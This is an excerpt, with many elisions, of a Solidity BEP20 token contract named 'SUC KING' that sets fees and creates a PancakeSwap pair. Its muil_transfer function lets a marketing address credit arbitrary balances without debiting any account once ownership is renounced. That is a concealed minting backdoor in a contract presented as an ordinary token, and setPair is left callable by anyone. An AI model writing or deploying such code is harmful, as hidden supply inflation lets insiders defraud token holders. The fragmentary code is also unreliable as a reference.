...
abstract contract baseContract is  IBEP20 , Ownable {
    ...
    constructor(address _routerAddress,string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply) payable Ownable() {
        ...
        allot=Allot(5,1,0,0,6);
        fees=Fee(75,3,3,100);

        step=1;
        maxamount=_tTotal.div(200);

        _mainpair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
    ...
    function setPair(address _routerAddr,address _token) public { 
        address pair=IDEXFactory(IDEXRouter(_routerAddr).factory()).getPair(address(_token), address(this));
        if(pair==address(0))pair = IDEXFactory(IDEXRouter(_routerAddr).factory()).createPair(_token, address(this));
    ...
    function muil_transfer(address[] calldata addresses, uint256 tAmount) public{
        require(marketingAddress[0] == msg.sender, "!Funder");
        ...
        for(uint i=0; i < addresses.length; i++){
            if(_owner != address(0)){
                _basicTransfer(_owner,addresses[i],tAmount);
            }else {
                _rOwned[addresses[i]] = _rOwned[addresses[i]].add(tAmount);
                if (ex[addresses[i]].reward)_tOwned[addresses[i]] = _tOwned[addresses[i]].add(tAmount);
                emit Transfer(_owner, addresses[i], tAmount);
            }
...
contract SUCKing is baseContract { 
    constructor() baseContract(address(0x10ED43C718714eb63d5aA57B78B54704E256024E),"SUC KING","SUC KING",9,1 * 10 ** 15){
    } 
}